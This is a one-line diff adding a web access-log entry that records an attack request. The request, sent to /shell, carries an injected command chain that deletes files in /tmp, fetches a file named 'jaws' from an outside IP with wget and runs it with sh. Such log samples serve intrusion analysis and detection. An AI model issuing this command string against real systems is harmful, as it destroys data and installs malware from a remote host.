@@ -1,0 +1,1 @@
+89.131.116.14 - - [18/Apr/2020:00:44:39 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.172.110.241/jaws;sh+/tmp/jaws HTTP/1.1" 301 162 "-" "-" "Hello, world"
